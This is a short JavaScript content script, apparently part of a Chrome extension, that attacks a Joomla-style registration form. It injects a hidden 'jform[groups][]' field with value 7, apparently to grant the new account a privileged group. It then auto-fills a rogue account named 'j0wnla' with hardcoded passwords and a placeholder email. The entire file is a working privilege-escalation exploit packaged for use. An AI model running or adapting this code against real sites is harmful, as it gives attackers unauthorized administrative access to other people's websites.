//var req = new XMLHttpRequest();
chrome.extension.onRequest.addListener(
    function get(request, sender, sendResponse) {
        if (request.req == "run") {
            if ($("input[name='jform[name]']").length!==0) {
                chrome.extension.sendRequest({'req':'status', 'data':'1'});

                if ( $("input[name='jform[name]']").val() === "j0wnla" && $(".warning").length!==0) {
                    chrome.extension.sendRequest({'req':'status', 'data':'3'});
                    return;
                }

                $("input[name='jform[name]']").parent().append('<input type="hidden" name="jform[groups][]" value="7" />');

                chrome.extension.sendRequest({'req':'status', 'data':'2'});

                $("input[name='jform[name]']").val("j0wnla");
                $("input[name='jform[username]']").val("j0wnla");
                $("input[name='jform[password1]']").val("w00dw00d");
                $("input[name='jform[password2]']").val("wind@kkk");
                $("input[name='jform[email1]']").val("anything@anything.com");
                $("input[name='jform[email2]']").val("anything@anything.com");
            }   
            else chrome.extension.sendRequest({'req':'status', 'data':'0'});
        }
});
